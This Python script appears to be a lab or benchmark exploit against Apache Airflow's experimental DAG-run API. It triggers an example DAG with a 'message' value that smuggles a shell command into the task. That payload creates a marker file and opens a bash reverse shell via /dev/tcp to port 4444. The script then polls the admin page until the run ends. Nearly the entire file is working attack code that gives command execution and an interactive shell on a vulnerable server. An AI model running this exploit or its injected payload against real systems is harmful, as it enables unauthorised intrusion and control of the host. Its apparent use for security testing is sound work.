#!/usr/bin/env python3
"""Trigger the vulnerable example DAG with an injected shell command."""

import json
import os
import time
import urllib.request
import urllib.parse
import uuid
from html.parser import HTMLParser


DAG_ID = "example_trigger_target_dag"
TARGET_FILE = "/tmp/dojo-file-creation/airflow_001_created"
API_PATH = "/api/experimental/dags/{}/dag_runs".format(DAG_ID)


class DagRunTableParser(HTMLParser):
    """Read the state of one run from Airflow's DAG runs table."""

    def __init__(self, run_id: str) -> None:
        super().__init__()
        self.run_id = run_id
        self.state = None
        self.current_column = None
        self.row_state = ""
        self.row_id = ""

    def handle_starttag(self, tag: str, attrs: list) -> None:
        if tag == "tr":
            self.row_state = ""
            self.row_id = ""
        if tag == "td":
            attributes = dict(attrs)
            self.current_column = attributes.get("class")

    def handle_data(self, data: str) -> None:
        if self.current_column == "col-state":
            self.row_state += data
        if self.current_column == "col-run_id":
            self.row_id += data

    def handle_endtag(self, tag: str) -> None:
        if tag == "td":
            self.current_column = None
        if tag == "tr" and self.row_id.strip() == self.run_id:
            self.state = self.row_state.strip()


def trigger_run(url: str, run_id: str, payload: str) -> None:
    request = urllib.request.Request(
        url,
        data=json.dumps({
            "run_id": run_id,
            "conf": json.dumps({"message": payload}),
        }).encode(),
        headers={"Content-Type": "application/json"},
    )
    with urllib.request.urlopen(request, timeout=20) as response:
        json.load(response)


def wait_for_dag_run(target_url: str, run_id: str) -> None:
    query = urllib.parse.urlencode({"search": run_id})
    url = "{}/admin/dagrun/?{}".format(target_url, query)
    deadline = time.monotonic() + 180
    while time.monotonic() < deadline:
        with urllib.request.urlopen(url, timeout=20) as response:
            page = response.read().decode()
        parser = DagRunTableParser(run_id)
        parser.feed(page)
        if parser.state in ("success", "failed"):
            return
        time.sleep(3)
    raise TimeoutError("DAG run did not finish")


def main() -> None:
    target_url = os.environ["REMOTE_TARGET_URL"].rstrip("/")
    run_id = "airflow_001_{}".format(uuid.uuid4().hex)
    payload = (
        '";touch {};bash -c \'bash -i >& /dev/tcp/localhost/4444 0>&1\';#'
    ).format(TARGET_FILE)
    url = target_url + API_PATH
    trigger_run(url, run_id, payload)
    wait_for_dag_run(target_url, run_id)
    print(json.dumps({"evidence_payload": {}}))


if __name__ == "__main__":
    main()
